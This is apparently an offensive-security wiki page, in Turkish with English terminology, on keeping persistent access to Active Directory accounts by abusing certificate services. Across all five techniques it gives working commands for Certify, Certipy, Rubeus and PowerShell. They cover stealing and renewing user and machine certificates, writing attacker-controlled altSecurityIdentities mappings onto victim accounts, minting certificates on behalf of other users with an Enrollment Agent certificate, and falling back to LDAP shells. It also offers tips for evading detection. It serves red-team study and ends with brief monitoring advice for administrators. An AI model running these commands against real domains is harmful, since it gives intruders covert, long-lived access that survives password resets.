# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Bu, [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) içindeki harika araştırmanın account persistence bölümlerinin kısa bir özetidir**

## Certificates ile Active User Credential Theft'i Anlamak – PERSIST1

Bir kullanıcının domain authentication yapmasına izin veren bir certificate talep edebildiği bir senaryoda, bir attacker bu certificate'i talep edip çalarak ağ üzerinde persistence sağlayabilir. Varsayılan olarak, Active Directory içindeki `User` template böyle taleplere izin verir, ancak bazen disabled olabilir.

[Certify](https://github.com/GhostPack/Certify) veya [Certipy](https://github.com/ly4k/Certipy) kullanarak, client authentication’a izin veren enabled template'leri arayabilir ve ardından bir tane talep edebilirsiniz:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Bir certificate’in gücü, certificate geçerli kaldığı sürece, password değişikliklerinden bağımsız olarak ait olduğu user olarak authenticate edebilme yeteneğinde yatar.

PEM’i PFX’e dönüştürebilir ve bir TGT almak için kullanabilirsiniz:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Note: Diğer tekniklerle birlikte (bkz. THEFT bölümleri), certificate-based auth, LSASS'a dokunmadan ve hatta yükseltilmemiş bağlamlardan kalıcı erişim sağlar.

## Sertifikalarla Makine Kalıcılığı Elde Etme - PERSIST2

Bir saldırgan bir host üzerinde elevated privileges sahipse, varsayılan `Machine` template kullanarak ele geçirilmiş sistemin machine account’unu bir certificate için enroll edebilir. Machine olarak authenticate olmak, local services için S4U2Self sağlar ve kalıcı host persistence sunabilir:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Sertifika Yenileme Yoluyla Persistence Genişletme - PERSIST3

Certificate template’lerin geçerlilik ve yenileme sürelerini abuse etmek, bir attacker’ın uzun vadeli erişimi sürdürmesine olanak tanır. Daha önce verilmiş bir certificate ve onun private key’ine sahipseniz, süresi dolmadan önce onu yenileyerek orijinal principal’a bağlı ek request artifact’leri bırakmadan yeni, uzun ömürlü bir credential elde edebilirsiniz.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operational tip: Saldırganın elindeki PFX dosyalarının sürelerini takip edin ve erken yenileyin. Yenileme ayrıca güncellenmiş sertifikaların modern SID mapping extension içermesine neden olabilir; bu da onları daha sıkı DC mapping kuralları altında kullanılabilir tutar (bkz. sonraki bölüm).

## Açık Certificate Mappings Eklemek (altSecurityIdentities) – PERSIST4

Bir hedef hesabın `altSecurityIdentities` attribute alanına yazabiliyorsanız, saldırganın kontrol ettiği bir certificate’ı açıkça o hesaba map edebilirsiniz. Bu, password değişikliklerinden sonra da kalıcıdır ve güçlü mapping formatları kullanıldığında modern DC enforcement altında işlevsel kalır.

Yüksek seviyeli akış:

1. Kontrol ettiğiniz bir client-auth certificate edinin veya oluşturun (ör. `User` template’ini kendiniz için enroll edin).
2. Cert içinden güçlü bir identifier çıkarın (Issuer+Serial, SKI veya SHA1-PublicKey).
3. Kurban principal’ın `altSecurityIdentities` alanına bu identifier ile açık bir mapping ekleyin.
4. Certificate’ınızla authenticate olun; DC bunu açık mapping üzerinden kurbana map eder.

Güçlü bir Issuer+Serial mapping kullanan örnek (PowerShell):
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Ardından PFX'inizle authenticate olun. Certipy TGT'yi doğrudan alacaktır:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Güçlü `altSecurityIdentities` eşlemeleri oluşturma

Pratikte, **Issuer+Serial** ve **SKI** eşlemeleri, saldırganın elindeki bir sertifikadan oluşturulabilecek en kolay güçlü formatlardır. Bu, **11 Şubat 2025** sonrasında önemlidir; bu tarihten itibaren DC'ler varsayılan olarak **Full Enforcement** kullanır ve zayıf eşlemeler güvenilir olmaktan çıkar.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notes
- Sadece güçlü mapping türlerini kullanın: `X509IssuerSerialNumber`, `X509SKI` veya `X509SHA1PublicKey`. Zayıf formatlar (Subject/Issuer, Subject-only, RFC822 email) deprecated’dir ve DC policy tarafından engellenebilir.
- Mapping hem **user** hem de **computer** objelerinde çalışır, bu yüzden bir computer account’un `altSecurityIdentities` alanına write access, o makine olarak persistence için yeterlidir.
- Cert chain, DC tarafından trusted bir root’a kadar build edebilmelidir. NTAuth içindeki Enterprise CA’lar genellikle trusted’dır; bazı ortamlarda public CA’lar da trusted olur.
- Schannel authentication, PKINIT başarısız olsa bile persistence için kullanışlı olmaya devam eder; çünkü DC’de Smart Card Logon EKU yoktur veya `KDC_ERR_PADATA_TYPE_NOSUPP` döndürür.

#### 2025+ `Issuer/SID` explicit mappings

**Windows Server 2022+** domain controller’larda, **9 Eylül 2025** security update ile Microsoft, persistence için çekici olan başka bir güçlü explicit mapping formatı ekledi; çünkü aynı CA’den yeniden certificate issuance yapılsa bile devam eder:
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Operasyonel olarak bu, eski güçlü formatlardan farklıdır:
- `Issuer+Serial` **tam olarak bir sertifikayı** sabitler.
- `SKI` / `SHA1-PUKEY` **bir anahtar çiftini** sabitler.
- `Issuer/SID` **veren CA + hedef SID** değerlerini sabitler, böylece aynı CA’dan yenilenen veya yeniden verilen sertifikalar `altSecurityIdentities` yeniden yazılmadan çalışmaya devam eder.

Gereksinimler ve uyarılar
- Logon için sunulan sertifika, SID security extension içinde gerçekten hedef hesap SID’sini içermelidir.
- Bu format, SID extension’ını içermeyen `ESC9` / `ESC16` tarzı sertifikalar için faydalı değildir; bu durumlarda `Issuer+Serial`, `SKI` veya `SHA1-PUKEY` kullanın.

Zayıf explicit mappings ve saldırı yolları hakkında daha fazla bilgi için, bkz:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

Geçerli bir Certificate Request Agent/Enrollment Agent sertifikası elde ederseniz, kullanıcılar adına istediğiniz zaman yeni logon-capable sertifikalar üretebilir ve agent PFX’i offline bir persistence token olarak saklayabilirsiniz. Abuse workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Bu persistence’i kaldırmak için agent certificate veya template permissions iptali gereklidir.

Operasyonel notlar
- Modern `Certipy` sürümleri hem `-on-behalf-of` hem de `-renew` destekler, bu yüzden Enrollment Agent PFX tutan bir attacker, orijinal target account’a tekrar dokunmadan leaf certificates üretebilir ve daha sonra renew edebilir.
- Eğer PKINIT tabanlı TGT retrieval mümkün değilse, ortaya çıkan on-behalf-of certificate yine de `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell` ile Schannel authentication için kullanılabilir.

## PKINIT Başarısız Olduğunda Persisted Certificates Kullanma

DC’de Smart Card Logon-capable certificate yoksa, PKINIT üzerinden certificate logon `KDC_ERR_PADATA_TYPE_NOSUPP` ile başarısız olabilir. Bu, persistence primitive’i **öldürmez**: aynı PFX çoğu zaman hâlâ Schannel-authenticated LDAP access için kullanılabilir.
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Bu özellikle PERSIST4/PERSIST5 sonrasında kullanışlıdır çünkü Linux/macOS üzerinden çalışmaya devam edebilir ve [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) bırakmak veya yazılabilir delegation attribute’larını düzenlemek gibi diğer directory persistence eylemlerini zincirleyebilirsiniz.

## 2025 Strong Certificate Mapping Enforcement: Persistence Üzerindeki Etki

Microsoft KB5014754, domain controller’larda Strong Certificate Mapping Enforcement’u tanıttı. **11 Şubat 2025** itibarıyla, DC’ler zayıf/belirsiz mapping’ler için varsayılan olarak **Full Enforcement** kullanır ve **9 Eylül 2025** security update’inden itibaren yamanmış DC’ler artık eski Compatibility-mode fallback’i desteklemez. Pratik sonuçlar:

- SID mapping extension içermeyen 2022 öncesi certificates, DC’ler Full Enforcement modundayken implicit mapping sırasında başarısız olabilir. Saldırganlar, certificate’ları AD CS üzerinden yenileyerek (SID extension elde etmek için) veya `altSecurityIdentities` içinde güçlü bir explicit mapping oluşturarak (PERSIST4) erişimi sürdürebilir.
- Güçlü formatlar (`Issuer+Serial`, `SKI`, `SHA1-PUKEY` ve modern DC’lerde `Issuer/SID`) kullanan explicit mappings çalışmaya devam eder. Zayıf formatlar (Issuer/Subject, Subject-only, RFC822) engellenebilir ve persistence için kaçınılmalıdır.
- Zayıf mappings hâlâ çalışıyor gibi görünüyorsa, bunun güvenilir bir uzun vadeli persistence yolu olduğunu değil, yamalanmamış ya da farklı yapılandırılmış bir DC’ye denk geldiğinizi varsayın.
- SID extension’ı bastıran `ESC9` / `ESC16` tarzı issuance yolları `Issuer/SID` kullanımını işlevsiz hale getirir; bu yüzden yedek güçlü mappings veya normal bir template üzerinden renewal, pratik persistence seçeneği olur.

Yöneticiler şunları izlemeli ve bunlar için alert üretmelidir:
- `altSecurityIdentities` üzerindeki değişiklikler ve Enrollment Agent ile User certificates’in issuance/renewal işlemleri.
- On-behalf-of istekleri ve alışılmadık renewal desenleri için CA issuance logs.

## References

- [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)

{{#include ../../../banners/hacktricks-training.md}}
